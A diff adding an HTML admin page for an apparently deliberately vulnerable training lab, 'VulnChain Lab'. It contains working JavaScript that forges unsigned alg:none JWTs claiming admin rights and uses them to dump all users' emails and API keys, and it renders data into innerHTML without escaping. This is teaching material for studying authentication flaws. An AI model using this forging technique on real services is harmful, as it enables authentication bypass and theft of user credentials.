@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel · VulnChain Lab</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --bg:      #0D1117;
+            --surface: #161B22;
+            --border:  #30363D;
+            --accent:  #F78166;
+            --text:    #E6EDF3;
+            --muted:   #8B949E;
+            --success: #3FB950;
+            --danger:  #F85149;
+            --warning: #D29922;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+        }
+
+        /* Navbar */
+        .navbar {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 0 24px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-brand {
+            font-size: 16px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .nav-brand span { color: var(--accent); }
+
+        .nav-badge-admin {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            background: rgba(248,81,73,0.15);
+            border: 1px solid rgba(248,81,73,0.3);
+            color: var(--danger);
+            padding: 2px 8px;
+            border-radius: 999px;
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .nav-user {
+            font-size: 13px;
+            color: var(--muted);
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .nav-user strong { color: var(--text); }
+
+        .btn-back {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        .btn-back:hover { border-color: var(--accent); color: var(--accent); }
+
+        .btn-logout {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        .btn-logout:hover { border-color: var(--danger); color: var(--danger); }
+
+        /* Main */
+        .main {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 32px 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* Card */
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 24px;
+        }
+
+        .card-title {
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+        .card-title::before {
+            content: '//';
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+        }
+
+        /* Vuln box */
+        .vuln-box {
+            background: rgba(248,81,73,0.06);
+            border: 1px solid rgba(248,81,73,0.25);
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-bottom: 20px;
+        }
+        .vuln-box-title {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--danger);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            margin-bottom: 6px;
+        }
+        .vuln-box-body {
+            font-size: 12px;
+            color: var(--muted);
+            font-family: 'JetBrains Mono', monospace;
+            line-height: 1.6;
+        }
+        .vuln-box-body code {
+            color: var(--accent);
+            background: rgba(247,129,102,0.1);
+            padding: 1px 5px;
+            border-radius: 3px;
+        }
+
+        /* JWT Forge section */
+        .forge-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .forge-box {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 14px;
+        }
+
+        .forge-box-label {
+            font-size: 11px;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        textarea {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: var(--success);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            resize: none;
+            outline: none;
+            min-height: 80px;
+        }
+
+        .btn {
+            padding: 9px 18px;
+            border: none;
+            border-radius: 8px;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .btn-primary {
+            background: var(--accent);
+            color: #fff;
+        }
+        .btn-primary:hover { filter: brightness(1.1); }
+        .btn-danger {
+            background: rgba(248,81,73,0.15);
+            color: var(--danger);
+            border: 1px solid rgba(248,81,73,0.3);
+        }
+        .btn-danger:hover { background: rgba(248,81,73,0.25); }
+        .btn-success {
+            background: rgba(63,185,80,0.15);
+            color: var(--success);
+            border: 1px solid rgba(63,185,80,0.3);
+        }
+        .btn-success:hover { background: rgba(63,185,80,0.25); }
+
+        .btn-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        /* Token display */
+        .token-box {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            word-break: break-all;
+            line-height: 1.6;
+            margin: 12px 0;
+            color: var(--muted);
+            min-height: 48px;
+        }
+        .token-box.forged {
+            border-color: rgba(248,81,73,0.4);
+            color: var(--danger);
+        }
+        .token-box.valid {
+            border-color: rgba(63,185,80,0.4);
+            color: var(--success);
+        }
+
+        /* Users table */
+        .table-wrapper {
+            overflow-x: auto;
+            border-radius: 8px;
+            border: 1px solid var(--border);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        thead {
+            background: var(--bg);
+        }
+
+        th {
+            padding: 10px 16px;
+            text-align: left;
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            vertical-align: middle;
+        }
+
+        tr:last-child td { border-bottom: none; }
+
+        tr:hover td { background: rgba(255,255,255,0.02); }
+
+        .role-badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 500;
+        }
+        .role-admin {
+            background: rgba(248,81,73,0.15);
+            color: var(--danger);
+            border: 1px solid rgba(248,81,73,0.3);
+        }
+        .role-user {
+            background: rgba(63,185,80,0.15);
+            color: var(--success);
+            border: 1px solid rgba(63,185,80,0.3);
+        }
+
+        .apikey-cell {
+            color: var(--accent);
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        /* Response box */
+        .response-box {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 14px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: var(--muted);
+            min-height: 60px;
+        }
+        .response-box.success { border-color: rgba(63,185,80,0.3); color: var(--success); }
+        .response-box.error { border-color: rgba(248,81,73,0.3); color: var(--danger); }
+
+        /* Access denied overlay */
+        .access-denied {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .access-denied h2 {
+            font-size: 20px;
+            color: var(--danger);
+            margin-bottom: 8px;
+        }
+        .access-denied p {
+            font-size: 13px;
+            color: var(--muted);
+            font-family: 'JetBrains Mono', monospace;
+            margin-bottom: 20px;
+        }
+
+        /* Divider */
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 16px 0;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 0.8; }
+        }
+        .loading { animation: shimmer 1.5s infinite; }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="nav-brand">
+        Vuln<span>Chain</span> Lab
+        <span class="nav-badge-admin">ADMIN PANEL</span>
+    </div>
+    <div class="nav-right">
+            <span class="nav-user">
+                <strong id="navUsername">...</strong>
+            </span>
+        <button class="btn-back" onclick="window.location.href='/dashboard.html'">← Dashboard</button>
+        <button class="btn-logout" onclick="logout()">Logout</button>
+    </div>
+</nav>
+
+<div class="main">
+
+    <!-- JWT Forge Tool -->
+    <div class="card">
+        <div class="card-title">JWT Algorithm Confusion · alg:none Attack</div>
+
+        <div class="vuln-box">
+            <div class="vuln-box-title">⚠ CWE-347 — Improper Verification of Cryptographic Signature</div>
+            <div class="vuln-box-body">
+                Server fallback accepts <code>alg:none</code> — forge any token without knowing the secret.<br>
+                Chain: IDOR leaked admin apiKey → forge JWT as admin → access this panel.
+            </div>
+        </div>
+
+        <div class="forge-grid">
+            <div class="forge-box">
+                <div class="forge-box-label">
+                    <span>Header (editable)</span>
+                    <span style="color:var(--danger);font-size:10px;">FORGED</span>
+                </div>
+                <textarea id="jwtHeader">{"alg":"none","typ":"JWT"}</textarea>
+            </div>
+            <div class="forge-box">
+                <div class="forge-box-label">
+                    <span>Payload (editable)</span>
+                    <span style="color:var(--danger);font-size:10px;">FORGED</span>
+                </div>
+                <textarea id="jwtPayload">{"sub":"admin","role":"ADMIN","iat":9999999999,"exp":9999999999}</textarea>
+            </div>
+        </div>
+
+        <div class="btn-row" style="margin-bottom:12px;">
+            <button class="btn btn-danger" onclick="forgeToken()">⚡ Forge JWT (alg:none)</button>
+            <button class="btn btn-success" onclick="useForgedToken()">→ Use Forged Token</button>
+            <button class="btn btn-primary" onclick="useMyToken()">Use My Token</button>
+        </div>
+
+        <div style="font-size:11px;color:var(--muted);margin-bottom:6px;font-family:'JetBrains Mono',monospace;">
+            Active token:
+        </div>
+        <div class="token-box" id="activeToken">—</div>
+
+        <hr>
+
+        <div class="btn-row">
+            <button class="btn btn-primary" onclick="loadAllUsers()">GET /api/v1/users — Load All</button>
+        </div>
+        <div class="response-box" id="apiResponse" style="margin-top:12px;">
+            // Use forged token → load all users → auth bypass confirmed
+        </div>
+    </div>
+
+    <!-- Users Table -->
+    <div class="card" id="usersCard" style="display:none;">
+        <div class="card-title">All Users — Data Dump</div>
+
+        <div class="vuln-box">
+            <div class="vuln-box-title">💀 Auth Bypass SUCCESS — CWE-285</div>
+            <div class="vuln-box-body">
+                Normal user forged admin JWT → accessed admin-only endpoint.<br>
+                Full user database exposed including sensitive apiKey fields.
+            </div>
+        </div>
+
+        <div class="table-wrapper">
+            <table>
+                <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Username</th>
+                    <th>Email</th>
+                    <th>Role</th>
+                    <th>API Key</th>
+                </tr>
+                </thead>
+                <tbody id="usersTableBody">
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    const token = localStorage.getItem('token');
+    const username = localStorage.getItem('username');
+
+    if (!token) window.location.href = '/index.html';
+
+    document.getElementById('navUsername').textContent = username || '?';
+    document.getElementById('activeToken').textContent = token;
+    document.getElementById('activeToken').className = 'token-box valid';
+
+    // Active token being used for requests
+    let activeToken = token;
+
+    function b64Encode(str) {
+        return btoa(unescape(encodeURIComponent(str)))
+            .replace(/\+/g, '-')
+            .replace(/\//g, '_')
+            .replace(/=/g, '');
+    }
+
+    function forgeToken() {
+        try {
+            const header  = document.getElementById('jwtHeader').value.trim();
+            const payload = document.getElementById('jwtPayload').value.trim();
+
+            // Validate JSON
+            JSON.parse(header);
+            JSON.parse(payload);
+
+            // Forge: base64url(header).base64url(payload). (no signature)
+            const forged = `${b64Encode(header)}.${b64Encode(payload)}.`;
+
+            document.getElementById('activeToken').textContent = forged;
+            document.getElementById('activeToken').className = 'token-box forged';
+
+            localStorage.setItem('forgedToken', forged);
+            activeToken = forged;
+
+            document.getElementById('apiResponse').className = 'response-box';
+            document.getElementById('apiResponse').textContent =
+                `// Forged token ready!\n// alg:none — no signature verification\n\n${forged}\n\n// Click "Use Forged Token" then "Load All Users"`;
+
+        } catch (e) {
+            document.getElementById('apiResponse').className = 'response-box error';
+            document.getElementById('apiResponse').textContent = `// JSON parse error: ${e.message}`;
+        }
+    }
+
+    function useForgedToken() {
+        const forged = localStorage.getItem('forgedToken');
+        if (!forged) {
+            alert('Forge a token first!');
+            return;
+        }
+        activeToken = forged;
+        document.getElementById('activeToken').textContent = forged;
+        document.getElementById('activeToken').className = 'token-box forged';
+    }
+
+    function useMyToken() {
+        activeToken = token;
+        document.getElementById('activeToken').textContent = token;
+        document.getElementById('activeToken').className = 'token-box valid';
+    }
+
+    async function loadAllUsers() {
+        const box = document.getElementById('apiResponse');
+        box.className = 'response-box loading';
+        box.textContent = '// Sending GET /api/v1/users ...';
+
+        try {
+            const resp = await fetch('/api/v1/users', {
+                headers: { 'Authorization': `Bearer ${activeToken}` }
+            });
+
+            const data = await resp.json();
+
+            if (resp.ok) {
+                box.className = 'response-box success';
+                box.textContent =
+                    `// ✓ Auth bypass SUCCESS! Status: ${resp.status}\n` +
+                    `// Got ${data.length} users\n\n` +
+                    JSON.stringify(data, null, 2);
+
+                renderUsersTable(data);
+
+            } else {
+                box.className = 'response-box error';
+                box.textContent =
+                    `// ✗ Failed: ${resp.status}\n` +
+                    `// Token rejected — try forging first\n\n` +
+                    JSON.stringify(data, null, 2);
+
+                document.getElementById('usersCard').style.display = 'none';
+            }
+
+        } catch (err) {
+            box.className = 'response-box error';
+            box.textContent = `// Connection error: ${err.message}`;
+        }
+    }
+
+    function renderUsersTable(users) {
+        const card = document.getElementById('usersCard');
+        const tbody = document.getElementById('usersTableBody');
+
+        tbody.innerHTML = users.map(u => `
+                <tr>
+                    <td>${u.id}</td>
+                    <td><strong>${u.username}</strong></td>
+                    <td>${u.email || '—'}</td>
+                    <td>
+                        <span class="role-badge ${u.role === 'ADMIN' ? 'role-admin' : 'role-user'}">
+                            ${u.role}
+                        </span>
+                    </td>
+                    <td class="apikey-cell" title="${u.apiKey || '—'}">
+                        ${u.apiKey || '—'}
+                    </td>
+                </tr>
+            `).join('');
+
+        card.style.display = 'block';
+        card.scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function logout() {
+        localStorage.clear();
+        window.location.href = '/index.html';
+    }
+</script>
+
+</body>
+</html>
